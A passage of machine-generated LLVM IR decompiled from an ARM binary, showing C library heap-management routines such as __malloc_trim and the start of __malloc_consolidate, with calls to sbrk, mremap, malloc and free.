  %v3_14c08 = inttoptr i32 %v2_14c08 to i32*
  store i32 %v3_14c04, i32* %v3_14c08, align 4
  %v0_14c0c = load i32, i32* @r5, align 4
  %v1_14c0c = add i32 %v0_14c0c, 8
  %v2_14c0c = inttoptr i32 %v1_14c0c to i32*
  %v3_14c0c = load i32, i32* %v2_14c0c, align 4
  store i32 %v3_14c0c, i32* %r3.global-to-local, align 4
  %v0_14c10 = load i32, i32* @ip, align 4
  %v1_14c14 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c14 = add i32 %v1_14c14, 8
  %v3_14c14 = inttoptr i32 %v2_14c14 to i32*
  store i32 %v3_14c0c, i32* %v3_14c14, align 4
  %tmp39 = icmp ult i32 %v0_14c10, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14bfc
  %v0_14c1c = load i32, i32* @r5, align 4
  %v1_14c1c = add i32 %v0_14c1c, 12
  %v2_14c1c = inttoptr i32 %v1_14c1c to i32*
  %v3_14c1c = load i32, i32* %v2_14c1c, align 4
  store i32 %v3_14c1c, i32* %r3.global-to-local, align 4
  %v1_14c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c20 = add i32 %v1_14c20, 12
  %v3_14c20 = inttoptr i32 %v2_14c20 to i32*
  store i32 %v3_14c1c, i32* %v3_14c20, align 4
  %v0_14c24 = load i32, i32* @r5, align 4
  %v1_14c24 = add i32 %v0_14c24, 16
  %v2_14c24 = inttoptr i32 %v1_14c24 to i32*
  %v3_14c24 = load i32, i32* %v2_14c24, align 4
  store i32 %v3_14c24, i32* %r3.global-to-local, align 4
  %v0_14c28 = load i32, i32* @ip, align 4
  %v1_14c2c = load i32, i32* %r1.global-to-local, align 4
  %v2_14c2c = add i32 %v1_14c2c, 16
  %v3_14c2c = inttoptr i32 %v2_14c2c to i32*
  store i32 %v3_14c24, i32* %v3_14c2c, align 4
  %tmp40 = icmp ult i32 %v0_14c28, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c1c
  %v0_14c34 = load i32, i32* @r5, align 4
  %v1_14c34 = add i32 %v0_14c34, 20
  %v2_14c34 = inttoptr i32 %v1_14c34 to i32*
  %v3_14c34 = load i32, i32* %v2_14c34, align 4
  store i32 %v3_14c34, i32* %r3.global-to-local, align 4
  %v1_14c38 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c38 = add i32 %v1_14c38, 20
  %v3_14c38 = inttoptr i32 %v2_14c38 to i32*
  store i32 %v3_14c34, i32* %v3_14c38, align 4
  %v0_14c3c = load i32, i32* @r5, align 4
  %v1_14c3c = add i32 %v0_14c3c, 24
  %v2_14c3c = inttoptr i32 %v1_14c3c to i32*
  %v3_14c3c = load i32, i32* %v2_14c3c, align 4
  store i32 %v3_14c3c, i32* %r3.global-to-local, align 4
  %v1_14c40 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c40 = add i32 %v1_14c40, 24
  %v3_14c40 = inttoptr i32 %v2_14c40 to i32*
  store i32 %v3_14c3c, i32* %v3_14c40, align 4
  %v0_14c44 = load i32, i32* @ip, align 4
  %v7_14c44 = icmp eq i32 %v0_14c44, 9
  br i1 %v7_14c44, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14c34
  %v1_14c48 = load i32, i32* @r5, align 4
  %v2_14c48 = add i32 %v1_14c48, 28
  %v3_14c48 = inttoptr i32 %v2_14c48 to i32*
  %v4_14c48 = load i32, i32* %v3_14c48, align 4
  store i32 %v4_14c48, i32* %r3.global-to-local, align 4
  %v2_14c4c = load i32, i32* %r1.global-to-local, align 4
  %v3_14c4c = add i32 %v2_14c4c, 28
  %v4_14c4c = inttoptr i32 %v3_14c4c to i32*
  store i32 %v4_14c48, i32* %v4_14c4c, align 4
  %v1_14c50 = load i32, i32* @r5, align 4
  %v2_14c50 = add i32 %v1_14c50, 32
  %v3_14c50 = inttoptr i32 %v2_14c50 to i32*
  %v4_14c50 = load i32, i32* %v3_14c50, align 4
  store i32 %v4_14c50, i32* %r3.global-to-local, align 4
  %v2_14c54 = load i32, i32* %r1.global-to-local, align 4
  %v3_14c54 = add i32 %v2_14c54, 32
  %v4_14c54 = inttoptr i32 %v3_14c54 to i32*
  store i32 %v4_14c50, i32* %v4_14c54, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14c34, %dec_label_pc_14c1c, %dec_label_pc_14bfc, %dec_label_pc_14bf0, %bb32
  %v0_14c58 = load i32, i32* @r5, align 4
  store i32 %v0_14c58, i32* @r0, align 4
  %v0_14c5c = call i32 @free()
  store i32 %v0_14c5c, i32* %r0.global-to-local, align 4
  %v0_14c60 = load i32, i32* @r7, align 4
  %v1_14c60 = add i32 %v0_14c60, 8
  store i32 %v1_14c60, i32* @r4, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14c68:                               ; preds = %bb30, %.thread2, %dec_label_pc_14ba8
  %v0_14c7c = phi i32 [ %v3_14bd8, %.thread2 ], [ %v1_14af0, %bb30 ], [ %v1_14c68.pre, %dec_label_pc_14ba8 ]
  %v0_14c68 = load i32, i32* @sb, align 4
  %v2_14c68 = sub i32 %v0_14c7c, %v0_14c68
  store i32 %v2_14c68, i32* %r1.global-to-local, align 4
  %v0_14c70 = load i32, i32* @sl, align 4
  %v1_14c70 = add i32 %v0_14c70, 4
  %v2_14c70 = inttoptr i32 %v1_14c70 to i32*
  %v3_14c70 = load i32, i32* %v2_14c70, align 4
  %tmp41 = icmp ugt i32 %v2_14c68, 15
  %v1_14c98 = urem i32 %v3_14c70, 2
  store i32 %v1_14c98, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_14c98, label %dec_label_pc_14c78

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14c68
  %v2_14c7c = or i32 %v1_14c98, %v0_14c7c
  store i32 %v2_14c7c, i32* %r3.global-to-local, align 4
  store i32 %v2_14c7c, i32* %v2_14c70, align 4
  %v0_14c84 = load i32, i32* @sl, align 4
  %v1_14c84 = load i32, i32* %r0.global-to-local, align 4
  %v2_14c84 = add i32 %v1_14c84, %v0_14c84
  store i32 %v2_14c84, i32* %r2.global-to-local, align 4
  %v1_14c88 = add i32 %v2_14c84, 4
  %v2_14c88 = inttoptr i32 %v1_14c88 to i32*
  %v3_14c88 = load i32, i32* %v2_14c88, align 4
  %v1_14c8c = or i32 %v3_14c88, 1
  store i32 %v1_14c8c, i32* %r3.global-to-local, align 4
  store i32 %v1_14c8c, i32* %v2_14c88, align 4
  br label %dec_label_pc_14cc8

dec_label_pc_14c98:                               ; preds = %dec_label_pc_14c68
  %v2_14c9c = add i32 %v0_14c70, %v0_14c68
  store i32 %v2_14c9c, i32* %r0.global-to-local, align 4
  %v2_14ca0 = or i32 %v1_14c98, %v0_14c68
  store i32 %v2_14ca0, i32* %r3.global-to-local, align 4
  %v1_14ca4 = or i32 %v2_14c68, 1
  store i32 %v1_14ca4, i32* %r2.global-to-local, align 4
  store i32 %v2_14ca0, i32* %v2_14c70, align 4
  %v0_14cac = load i32, i32* %r2.global-to-local, align 4
  %v1_14cac = load i32, i32* %r0.global-to-local, align 4
  %v2_14cac = add i32 %v1_14cac, 4
  %v3_14cac = inttoptr i32 %v2_14cac to i32*
  store i32 %v0_14cac, i32* %v3_14cac, align 4
  %v0_14cb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14cb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14cb0 = add i32 %v1_14cb0, %v0_14cb0
  store i32 %v2_14cb0, i32* %r2.global-to-local, align 4
  %v1_14cb4 = add i32 %v2_14cb0, 4
  %v2_14cb4 = inttoptr i32 %v1_14cb4 to i32*
  %v3_14cb4 = load i32, i32* %v2_14cb4, align 4
  %v1_14cb8 = or i32 %v3_14cb4, 1
  store i32 %v1_14cb8, i32* %r3.global-to-local, align 4
  store i32 %v1_14cb8, i32* %v2_14cb4, align 4
  %v0_14cc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14cc0 = add i32 %v0_14cc0, 8
  store i32 %v1_14cc0, i32* @r0, align 4
  %v0_14cc4 = call i32 @free()
  store i32 %v0_14cc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14c78, %dec_label_pc_14c98
  %v0_14cc8 = load i32, i32* @sl, align 4
  %v1_14cc8 = add i32 %v0_14cc8, 8
  store i32 %v1_14cc8, i32* @r4, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14cd0:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_14cd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14cd8, i32* @r8, align 4
  %v2_14cdc = inttoptr i32 %v1_14aec to i32*
  %v3_14cdc = load i32, i32* %v2_14cdc, align 4
  store i32 %v3_14cdc, i32* @r4, align 4
  %v1_14ce0 = add i32 %v4_14cd8, 860
  %v2_14ce0 = inttoptr i32 %v1_14ce0 to i32*
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  %v1_14ce4 = add i32 %v3_14cdc, 4
  %v1_14ce8 = add i32 %v3_14ce0, -1
  store i32 %v1_14ce8, i32* %r2.global-to-local, align 4
  %v2_14cec = add i32 %v1_14ce4, %v1_14ce8
  %v1_14cf0 = load i32, i32* @sb, align 4
  %v2_14cf0 = add i32 %v2_14cec, %v1_14cf0
  store i32 %v2_14cf0, i32* %r3.global-to-local, align 4
  %v2_14cf4 = sub i32 0, %v3_14ce0
  %v3_14cf4 = and i32 %v2_14cf0, %v2_14cf4
  store i32 %v3_14cf4, i32* @r7, align 4
  %v2_14cf8 = sub i32 %v3_14cf4, %v3_14cdc
  store i32 %v2_14cf8, i32* @fp, align 4
  %v9_14cfc = icmp eq i32 %v1_14af0, %v2_14cf8
  br i1 %v9_14cfc, label %dec_label_pc_14d70, label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14cd0
  %v2_14d04 = sub i32 %v1_14aec, %v3_14cdc
  store i32 %v2_14d04, i32* %r0.global-to-local, align 4
  %v2_14d08 = add i32 %v3_14cdc, %v1_14af0
  store i32 %v2_14d08, i32* %r1.global-to-local, align 4
  store i32 %v3_14cf4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_14d14 = call i32 @mremap(i32 %v2_14d04, i32 %v2_14d08, i32 %v3_14cf4, i32 1)
  store i32 %v4_14d14, i32* %r0.global-to-local, align 4
  %v7_14d18 = icmp eq i32 %v4_14d14, -1
  br i1 %v7_14d18, label %dec_label_pc_14d64, label %dec_label_pc_14d20

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14d04
  %v1_14d20 = load i32, i32* @r4, align 4
  %v2_14d20 = add i32 %v1_14d20, %v4_14d14
  store i32 %v2_14d20, i32* %r0.global-to-local, align 4
  %v0_14d24 = load i32, i32* @fp, align 4
  %v1_14d24 = or i32 %v0_14d24, 2
  store i32 %v1_14d24, i32* %r3.global-to-local, align 4
  %v2_14d28 = add i32 %v2_14d20, 4
  %v3_14d28 = inttoptr i32 %v2_14d28 to i32*
  store i32 %v1_14d24, i32* %v3_14d28, align 4
  %v0_14d2c = load i32, i32* @r8, align 4
  %v1_14d2c = add i32 %v0_14d2c, 868
  %v2_14d2c = inttoptr i32 %v1_14d2c to i32*
  %v3_14d2c = load i32, i32* %v2_14d2c, align 4
  store i32 %v3_14d2c, i32* %r3.global-to-local, align 4
  %v1_14d30 = add i32 %v0_14d2c, 880
  %v2_14d30 = inttoptr i32 %v1_14d30 to i32*
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  store i32 %v3_14d30, i32* %r2.global-to-local, align 4
  %v0_14d34 = load i32, i32* @r6, align 4
  %v2_14d34 = sub i32 %v3_14d2c, %v0_14d34
  store i32 %v2_14d34, i32* %r3.global-to-local, align 4
  %v1_14d38 = load i32, i32* @r7, align 4
  %v2_14d38 = add i32 %v1_14d38, %v2_14d34
  store i32 %v2_14d38, i32* %r1.global-to-local, align 4
  %v1_14d3c = add i32 %v0_14d2c, 872
  %v2_14d3c = inttoptr i32 %v1_14d3c to i32*
  %v3_14d3c = load i32, i32* %v2_14d3c, align 4
  store i32 %v3_14d3c, i32* %r3.global-to-local, align 4
  %v1_14d44 = add i32 %v0_14d2c, 884
  %v2_14d44 = inttoptr i32 %v1_14d44 to i32*
  %v3_14d44 = load i32, i32* %v2_14d44, align 4
  store i32 %v3_14d44, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_14d38, %v3_14d30
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_14d20
  store i32 %v2_14d38, i32* %v2_14d30, align 4
  %v0_14d4c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14d4c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_14d20, %bb33
  %v1_14d4c = phi i32 [ %v0_14d2c, %dec_label_pc_14d20 ], [ %v1_14d4c.pre, %bb33 ]
  %v0_14d4c = phi i32 [ %v2_14d38, %dec_label_pc_14d20 ], [ %v0_14d4c.pre, %bb33 ]
  %v2_14d4c = add i32 %v1_14d4c, 868
  %v3_14d4c = inttoptr i32 %v2_14d4c to i32*
  store i32 %v0_14d4c, i32* %v3_14d4c, align 4
  %v0_14d50 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d50 = add i32 %v1_14d50, %v0_14d50
  store i32 %v2_14d50, i32* %r1.global-to-local, align 4
  %v1_14d54 = load i32, i32* %r2.global-to-local, align 4
  %v0_14d58 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d58 = add i32 %v0_14d58, 8
  store i32 %v1_14d58, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14d50, %v1_14d54
  br i1 %tmp43, label %bb35, label %dec_label_pc_14d9c

bb35:                                             ; preds = %bb34
  %v5_14d5c = load i32, i32* @r8, align 4
  %v6_14d5c = add i32 %v5_14d5c, 884
  %v7_14d5c = inttoptr i32 %v6_14d5c to i32*
  store i32 %v2_14d50, i32* %v7_14d5c, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d04
  %v0_14d64 = load i32, i32* @sb, align 4
  %v1_14d64 = add i32 %v0_14d64, 4
  store i32 %v1_14d64, i32* %r3.global-to-local, align 4
  %v0_14d68 = load i32, i32* @r6, align 4
  %v3_14d68 = icmp ult i32 %v0_14d68, %v1_14d64
  br i1 %v3_14d68, label %dec_label_pc_14d78, label %dec_label_pc_14d64.dec_label_pc_14d70_crit_edge

dec_label_pc_14d64.dec_label_pc_14d70_crit_edge:  ; preds = %dec_label_pc_14d64
  %v0_14d70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d64.dec_label_pc_14d70_crit_edge, %dec_label_pc_14cd0
  %v0_14d70 = phi i32 [ %v0_14d70.pre, %dec_label_pc_14d64.dec_label_pc_14d70_crit_edge ], [ %v0_14ad8, %dec_label_pc_14cd0 ]
  store i32 %v0_14d70, i32* @r4, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d64
  %v1_14d78 = add i32 %v0_14d64, -7
  store i32 %v1_14d78, i32* @r0, align 4
  %v0_14d7c = call i32 @malloc()
  store i32 %v0_14d7c, i32* @r0, align 4
  store i32 %v0_14d7c, i32* @r4, align 4
  %v2_14d80 = icmp eq i32 %v0_14d7c, 0
  br i1 %v2_14d80, label %dec_label_pc_14d9c, label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d78
  %v0_14d88 = load i32, i32* @r6, align 4
  %v1_14d88 = add i32 %v0_14d88, -8
  store i32 %v1_14d88, i32* @r2, align 4
  %v0_14d8c = load i32, i32* @r5, align 4
  store i32 %v0_14d8c, i32* @r1, align 4
  %v0_14d90 = call i32 @memcpy()
  %v0_14d94 = load i32, i32* @r5, align 4
  store i32 %v0_14d94, i32* @r0, align 4
  %v0_14d98 = call i32 @free()
  store i32 %v0_14d98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14d78, %dec_label_pc_14d70, %dec_label_pc_14cc8, %.thread6, %dec_label_pc_14b38, %dec_label_pc_14d88
  store i32 %v2_14a84, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v4_14dac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14dac)
  br label %dec_label_pc_14db8

dec_label_pc_14db8:                               ; preds = %dec_label_pc_14ab8, %dec_label_pc_14a60, %dec_label_pc_14a48, %dec_label_pc_14d9c
  %v0_14db8 = load i32, i32* @r4, align 4
  store i32 %v0_14db8, i32* %r0.global-to-local, align 4
  store i32 %v3_14a28, i32* @r4, align 4
  store i32 %v6_14a28, i32* @r5, align 4
  store i32 %v9_14a28, i32* @r6, align 4
  store i32 %v12_14a28, i32* @r7, align 4
  store i32 %v15_14a28, i32* @r8, align 4
  store i32 %v18_14a28, i32* @sb, align 4
  store i32 %v21_14a28, i32* @sl, align 4
  store i32 %v24_14a28, i32* @fp, align 4
  store i32 %v27_14a28, i32* @lr, align 4
  ret i32 %v0_14db8

; uselistorder directives
  uselistorder i32 %v2_14d50, { 1, 0, 2 }
  uselistorder i32 %v2_14d38, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14d14, { 1, 0, 2 }
  uselistorder i32 %v3_14cf4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14c98, { 2, 1, 0 }
  uselistorder i32 %v2_14c68, { 1, 0, 2 }
  uselistorder i32 %v0_14bfc, { 1, 0 }
  uselistorder i32 %v0_14bb8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_14b1c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14b14, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_14af8, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_14af0, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_14aec, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_14adc, { 1, 0 }
  uselistorder i32 %v0_14ad8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14ab0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 20, 12, 14, 13, 21, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14db8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14d9c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_14cc8, { 1, 0 }
  uselistorder label %dec_label_pc_14c68, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14bb4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14ba8, { 1, 0 }
  uselistorder label %dec_label_pc_14ba4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14dcc(i16* %arg1) local_unnamed_addr {
dec_label_pc_14dcc:
  %v0_14dcc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14dcc, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_14dcc
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_14dcc
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14de8 = add i32 %arg2, 44
  %v2_14de8 = inttoptr i32 %v1_14de8 to i32*
  %v3_14de8 = load i32, i32* %v2_14de8, align 4
  %v12_14dec = load i32, i32* @r7, align 4
  %v1_14df0 = add i32 %v3_14de8, 4
  %v2_14df0 = inttoptr i32 %v1_14df0 to i32*
  %v3_14df0 = load i32, i32* %v2_14df0, align 4
  %v1_14df4 = add i32 %arg2, 860
  %v2_14df4 = inttoptr i32 %v1_14df4 to i32*
  %v3_14df4 = load i32, i32* %v2_14df4, align 4
  store i32 %v3_14df4, i32* @r4, align 4
  %v1_14df8 = and i32 %v3_14df0, -4
  store i32 %v1_14df8, i32* @r6, align 4
  %v1_14dfc = add i32 %v1_14df8, -17
  %v2_14e00 = add i32 %v1_14dfc, %v3_14df4
  store i32 %arg2, i32* @r5, align 4
  %v2_14e0c = sub i32 %v2_14e00, %arg1
  store i32 %v3_14df4, i32* %r1.global-to-local, align 4
  %v2_14e14 = udiv i32 %v2_14e0c, %v3_14df4
  %v1_14e18 = add i32 %v2_14e14, -1
  store i32 %v1_14e18, i32* %r0.global-to-local, align 4
  %v2_14e1c = mul i32 %v1_14e18, %v3_14df4
  store i32 %v2_14e1c, i32* @r7, align 4
  %v2_14e20 = icmp eq i32 %v2_14e1c, 0
  store i1 %v2_14e20, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_14e1c, 1
  br i1 %tmp8, label %dec_label_pc_14e88, label %dec_label_pc_14e28

dec_label_pc_14e28:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14e2c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14e2c, i32* %r0.global-to-local, align 4
  %v0_14e30 = load i32, i32* @r5, align 4
  %v1_14e30 = add i32 %v0_14e30, 44
  %v2_14e30 = inttoptr i32 %v1_14e30 to i32*
  %v3_14e30 = load i32, i32* %v2_14e30, align 4
  %v0_14e34 = load i32, i32* @r6, align 4
  %v2_14e34 = add i32 %v0_14e34, %v3_14e30
  %v9_14e38 = icmp eq i32 %v1_14e2c, %v2_14e34
  store i1 %v9_14e38, i1* @cpsr_z, align 1
  store i32 %v1_14e2c, i32* @r4, align 4
  br i1 %v9_14e38, label %dec_label_pc_14e44, label %dec_label_pc_14e88

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14e28
  %v0_14e44 = load i32, i32* @r7, align 4
  %v1_14e44 = sub i32 0, %v0_14e44
  store i32 %v1_14e44, i32* %r0.global-to-local, align 4
  %v1_14e48 = call i32 @__GI_sbrk(i32 %v1_14e44)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14e50 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14e50, i32* %r0.global-to-local, align 4
  %v7_14e54 = icmp eq i32 %v1_14e50, -1
  store i1 %v7_14e54, i1* @cpsr_z, align 1
  br i1 %v7_14e54, label %dec_label_pc_14e88, label %dec_label_pc_14e5c

dec_label_pc_14e5c:                               ; preds = %dec_label_pc_14e44
  %v0_14e5c = load i32, i32* @r4, align 4
  %v2_14e5c = sub i32 %v0_14e5c, %v1_14e50
  store i32 %v2_14e5c, i32* %r0.global-to-local, align 4
  %v9_14e5c = icmp eq i32 %v0_14e5c, %v1_14e50
  store i1 %v9_14e5c, i1* @cpsr_z, align 1
  br i1 %v9_14e5c, label %dec_label_pc_14e88, label %dec_label_pc_14e64

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e5c
  %v0_14e64 = load i32, i32* @r5, align 4
  %v1_14e64 = add i32 %v0_14e64, 872
  %v2_14e64 = inttoptr i32 %v1_14e64 to i32*
  %v3_14e64 = load i32, i32* %v2_14e64, align 4
  %v1_14e68 = load i32, i32* @r6, align 4
  %v2_14e68 = sub i32 %v1_14e68, %v2_14e5c
  store i32 %v2_14e68, i32* %r2.global-to-local, align 4
  %v1_14e6c = add i32 %v0_14e64, 44
  %v2_14e6c = inttoptr i32 %v1_14e6c to i32*
  %v3_14e6c = load i32, i32* %v2_14e6c, align 4
  store i32 %v3_14e6c, i32* %r1.global-to-local, align 4
  %v2_14e70 = sub i32 %v3_14e64, %v2_14e5c
  %v1_14e74 = or i32 %v2_14e68, 1
  store i32 %v1_14e74, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14e70, i32* %v2_14e64, align 4
  %v0_14e80 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e80 = load i32, i32* %r1.global-to-local, align 4
  %v2_14e80 = add i32 %v1_14e80, 4
  %v3_14e80 = inttoptr i32 %v2_14e80 to i32*
  store i32 %v0_14e80, i32* %v3_14e80, align 4
  %v1_14e94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e8c

dec_label_pc_14e88:                               ; preds = %dec_label_pc_14e28, %dec_label_pc_14e5c, %dec_label_pc_14e44, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14e88
  %v1_14e94 = phi i32 [ %v1_14e94.pre, %dec_label_pc_14e64 ], [ 0, %dec_label_pc_14e88 ]
  store i32 %v12_14dec, i32* @r7, align 4
  ret i32 %v1_14e94

; uselistorder directives
  uselistorder i1 %v7_14e54, { 1, 0 }
  uselistorder i32 %v1_14e50, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14df4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14e8c, { 1, 0 }
  uselistorder label %dec_label_pc_14e88, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14e98 = load i32, i32* @r4, align 4
  store i32 %v3_14e98, i32* %stack_var_-36, align 4
  %v0_14e9c = load i32, i32* @r0, align 4
  %v1_14e9c = inttoptr i32 %v0_14e9c to i32*
  %v2_14e9c = load i32, i32* %v1_14e9c, align 4
  store i32 %v2_14e9c, i32* %r3.global-to-local, align 4
  %v2_14ea0 = icmp eq i32 %v2_14e9c, 0
  store i32 %v0_14e9c, i32* @r4, align 4
  br i1 %v2_14ea0, label %dec_label_pc_14fd8.preheader, label %dec_label_pc_14eb4

dec_label_pc_14fd8.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_14fe025 = add i32 %v0_14e9c, 52
  store i32 %v1_14fe025, i32* %r3.global-to-local, align 4
  %v2_14fe826 = add i32 %v0_14e9c, 60
  %v3_14fe827 = inttoptr i32 %v2_14fe826 to i32*
  store i32 %v1_14fe025, i32* %v3_14fe827, align 4
  %v0_14fec28 = load i32, i32* %r3.global-to-local, align 4
  %v2_14fec29 = add i32 %v0_14fec28, 12
  %v3_14fec30 = inttoptr i32 %v2_14fec29 to i32*
  store i32 %v0_14fec28, i32* %v3_14fec30, align 4
  br label %dec_label_pc_14fd8.dec_label_pc_14fd8_crit_edge

dec_label_pc_14eb4:                               ; preds = %entry
  %v1_14eb4 = and i32 %v2_14e9c, -3
  %v3_14eb8 = udiv i32 %v2_14e9c, 8
  store i32 %v3_14eb8, i32* %r2.global-to-local, align 4
  store i32 %v1_14eb4, i32* %v1_14e9c, align 4
  %v0_14ec0 = load i32, i32* @r0, align 4
  %v1_14ec0 = add i32 %v0_14ec0, -4
  store i32 %v1_14ec0, i32* %r3.global-to-local, align 4
  %v1_14ec4 = load i32, i32* %r2.global-to-local, align 4
  %v4_14ec4 = mul i32 %v1_14ec4, 4
  %v5_14ec4 = add i32 %v4_14ec4, %v1_14ec0
  store i32 %v5_14ec4, i32* %sb.global-to-local, align 4
  %v1_14ec8 = add i32 %v0_14ec0, 52
  store i32 %v1_14ec8, i32* %r7.global-to-local, align 4
